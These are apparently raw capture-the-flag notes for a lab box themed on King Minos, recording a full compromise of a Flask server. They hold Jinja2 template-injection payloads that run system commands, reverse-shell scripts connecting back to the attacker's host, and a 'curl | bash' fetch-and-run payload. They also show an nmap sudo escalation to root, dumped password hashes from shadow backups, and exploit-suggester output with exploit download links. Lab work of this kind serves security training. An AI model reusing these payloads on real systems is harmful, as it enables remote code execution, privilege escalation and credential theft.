|4,39,1,0,1596490626,"~/.Website/templates/index.html" # History of marks within files (newest to oldest): > ~/Crete_Shores * 1597927385 0 " 1 0 ^ 1 0 . 28 16 + 1 40 + 28 16 > ~/.Website/templates/index.html * 1597927346 0 " 7 1 ^ 7 2 . 7 1 + 33 85 + 33 9 + 36 1 + 35 0 + 6 53 + 32 1 + 31 1 + 29 1 + 28 1 + 26 1 + 25 1 + 24 1 + 22 1 + 21 1 + 20 1 + 19 1 + 17 1 + 16 1 + 16 0 + 14 1 + 12 1 + 10 1 + 9 1 + 8 1 + 7 1 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-lah%20/home/minos/.ssh%27).read()}}

total 3.0K drwx------ 2 minos minos 3 Aug 4 2020 . drwxr-xr-x 6 minos minos 13 Aug 20 2020 .. -rw-r--r-- 1 minos minos 444 Aug 4 2020 known_hosts 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-lah%20/home/minos/.Website%27).read()}}

total 5.5K drwxr-xr-x 5 minos minos 6 Aug 3 2020 . drwxr-xr-x 6 minos minos 13 Aug 20 2020 .. drwxr-xr-x 2 minos minos 3 Aug 3 2020 __pycache__ -rwxr-xr-x 1 minos minos 323 Aug 3 2020 app.py drwxr-xr-x 2 minos minos 3 Aug 3 2020 static drwxr-xr-x 2 minos minos 3 Aug 20 2020 templates 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/.Website/app.py%27).read()}}

#!/usr/bin/python from flask import * import os app = Flask(__name__) @app.route('/') def index(): if request.args.get('key'): return render_template_string(request.args.get('key')) else: return render_template('index.html') if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20/home/minos/.Website/templates%27).read()}}

index.html 

┌──(witty㉿kali)-[~]
└─$ cat shell.py       
import pty;
RHOST=10.8.19.103
RPORT=4444
import sys
import socket
import os
import pty
s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")

http://10.10.238.128:8080/?key={{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401]([%22wget%22,%20%22http://10.8.19.103:8000/shell.py%22],%20stdout=-1,%20stderr=-1).communicate()}}

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

internal server

another way revshell

https://kleiber.me/blog//python-flask-jinja2-ssti-example/

┌──(witty㉿kali)-[~]
└─$ cat revshell1 
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.238.128 - - [02/Jul/2023 14:51:55] "GET /revshell1 HTTP/1.1" 200 -

http://10.10.238.128:8080/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%2010.8.19.103/revshell1%20|%20bash%27).read()}}

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from theseus.thm [10.10.238.128] 40798
bash: cannot set terminal process group (212): Inappropriate ioctl for device
bash: no job control in this shell
minos@Minos:/$ which python
which python
/usr/bin/python
minos@Minos:/$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
minos@Minos:/$ id
id
uid=1001(minos) gid=1001(minos) groups=1001(minos)

minos@Minos:~/.Website/templates$ cat index.html
cat index.html
<html>
	<head>
	</head>
	<body>
		<pre>
		King Minos of Crete was feared by all of the rulers
		of the lands around him. When he demanded offerings
		or men for his armies, all agreed to his demands.
		When he demanded they send tributes to honour him,
		they sent them without question.

		But his demands on Athens became too great.

		King Minos had constructed a great palace in Knossos.
		Inside this palace he instructed Daedalus to be the 
		architect of a great labyrinth, and, at the centre
		of the maze he kept his wife's son - The Minotaur.

		It was powerful, and savage, and would eat the flesh
		of the offerings sent into the labyrinth by King Minos.
		They would wander through the maze, completely lost, 
		until at last they came face to face with the Minotaur.

		As for Athens, Minos demanded every year the King send
		him seven young men and women. One year, he sent his son:
		Theseus.

		Before leaving, Theseus' father gave him a letter with 
		a message to help him on his way to Crete.

		On the bottom of the letter was a message Theseus didn't
		quite understand: 
	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	
	

		<img src="{{url_for('static', filename='Knossos.jpg')}}" />
	</body>
</html>

minos@Minos:/var/backups$ sudo -l
sudo -l
Matching Defaults entries for minos on Minos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap

https://gtfobins.github.io/gtfobins/nmap/

minos@Minos:/var/backups$ TF=$(mktemp)
TF=$(mktemp)
minos@Minos:/var/backups$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
minos@Minos:/var/backups$ sudo nmap --script=$TF
sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org )
NSE: Warning: Loading '/tmp/tmp.ZjVr5CnWrw' -- the recommended file extension is '.nse'.
```
```text
# whoami
root
```
```text
# cd /root
```
```text
# ls
dear_mr_SUID  minotaur
```
```text
# cat -v minotaur

       -""\
    .-"  .`)     (
   j   .'_+     :[                )      .^--..
  i    -"       |l                ].    /      i
 ," .:j         `8o  _,,+.,.--,   d|   `:::;    b
 i  :'|          "88p;.  (-."_"-.oP        \.   :
 ; .  (            >,%%%   f),):8"          \:'  i
i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
<  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  <
`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
 `.   `        `o`88888888b`%%%%%88< Y888P""'-    ;
   "`---`.       Y`888888888;;.,"888b."""..::::'-'
          "-....  b`8888888:::::.`8888._::-"
             `:::. `:::::O:::::::.`%%'|
              `.      "``::::::''    .'
                `.                   <
                  +:         `:   -';
                   `:         : .::/
                    ;+_  :::. :..;;;       
                    ;;;;,;;;;;;;;,;;
```
```text
# cat dear_mr_SUID
                 _.                              _______
           __.--'  |             ____...,---'''''     .'''-.
       _,-'        \ ____...--'''                     | '   '-._
    ,-'             |                                 |  \      -.
 ,-'                '                                 |   '       `\
|                    \                               .'    '   _,._/
|                     \                              |      '  \
|                     \                              |       \  '
||                     \                             |        \<
|\                      \                           |          \|
|'.                     \                           /           |
| |                      \                         |            '
| '.                      |                  ____,..             \
|  |                       \__,...-----''''''       `.            |
|  '.                      \                          \           '
|   |                       \                          `           \
|   '                        \                          `           |
|    |                        \                          \          \
|    '.                       '                           \          \
|     \                        \                           \       _,|
|      |                        \                           \ _,.--  |
|      '.                        ,                       _,.-'       |
'       \                  _,.-''                 __.,-''            |
 |       |             _.-'                _,.,--'                   |
 \        \        _.-'           __,.,--''                          |
 '        `.    ,-'      __..---''                                   |
 '         \ ,-'___..,--'                                            '
  \         -'''                                                     |
   .        |                                                       ,
    |       |                                                       |
    '       |                                                       |
     \      |                                                       |
      \     |                                                       |
       \    |                                                 __,.-''
        \   |                                        __,..-''
         \  |                              ___..--'''        
          \ |                     ___,.--''
           \|        ____...,--'''
            '_..,--''

Looks like you've exploited the nmap SUID.

Here's an empty box for the effort!

Perhaps checking the network information
and using the SUID based binary to look 
for other things to use that information
on that you should have got earlier.

Perhaps reading the story as you progress 
will help you, Good luck hero!
```
```text
# cat passwd.bak
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
minos:x:1001:1001:,,,:/home/minos:/bin/bash
```
```text
# cat shadow.bak
root:$6$aUdhO9uG$ZqouBnunknnMPCZcSgSI/hQw981KlULw6aIz3Lpj0.csKv2jZkpdpmtvgKYdf.7tBE45yRiHHt3Ss4GRT4jBO/:18477:0:99999:7:::
daemon:*:18472:0:99999:7:::
bin:*:18472:0:99999:7:::
sys:*:18472:0:99999:7:::
sync:*:18472:0:99999:7:::
games:*:18472:0:99999:7:::
man:*:18472:0:99999:7:::
lp:*:18472:0:99999:7:::
mail:*:18472:0:99999:7:::
news:*:18472:0:99999:7:::
uucp:*:18472:0:99999:7:::
proxy:*:18472:0:99999:7:::
www-data:*:18472:0:99999:7:::
backup:*:18472:0:99999:7:::
list:*:18472:0:99999:7:::
irc:*:18472:0:99999:7:::
gnats:*:18472:0:99999:7:::
nobody:*:18472:0:99999:7:::
systemd-network:*:18472:0:99999:7:::
systemd-resolve:*:18472:0:99999:7:::
syslog:*:18472:0:99999:7:::
messagebus:*:18472:0:99999:7:::
_apt:*:18472:0:99999:7:::
lxd:*:18472:0:99999:7:::
uuidd:*:18472:0:99999:7:::
dnsmasq:*:18472:0:99999:7:::
landscape:*:18472:0:99999:7:::
sshd:*:18472:0:99999:7:::
pollinate:*:18472:0:99999:7:::
minos:$6$jSUdIvQS$Fo3.S2x9LiZzg5paCZNQAxeYsAmks8rtZurBsQ4veDU51joRYSpYKt00DPAiZMkxKXwQ0wsTFuSAaIikOHmUh1:18477:0:99999:7:::
```
```text
# cat /proc/1/cgroup
12:hugetlb:/
11:perf_event:/
10:pids:/
9:cpuset:/
8:rdma:/
7:devices:/
6:freezer:/
5:cpu,cpuacct:/
4:memory:/
3:net_cls,net_prio:/
2:blkio:/
1:name=systemd:/init.scope
0::/init.scope

uhmm

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.238.128 - - [02/Jul/2023 15:15:01] code 404, message File not found
10.10.238.128 - - [02/Jul/2023 15:15:05] "GET /linpeas.sh HTTP/1.1" 200 -

minos@Minos:/tmp$ wget http://10.8.19.103/linpeas.sh
wget http://10.8.19.103/linpeas.sh
--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   570KB/s    in 1.4s    

(570 KB/s) - ‘linpeas.sh’ saved [828098/828098]

minos@Minos:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
minos@Minos:/tmp$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
User & Groups: uid=1001(minos) gid=1001(minos) groups=1001(minos)
Hostname: Minos
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

[+] nmap is available for network discovery & port scanning, you should use it yourself

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Sun Jul  2 19:15:55 UTC 2023
 19:15:55 up  3:25,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=minos
SHLVL=4
OLDPWD=/
HOME=/home/minos
LOGNAME=minos
JOURNAL_STREAM=9:37935
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=ffd3abccfe3749fda4f0d948e88a7d76
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security//5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security//5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
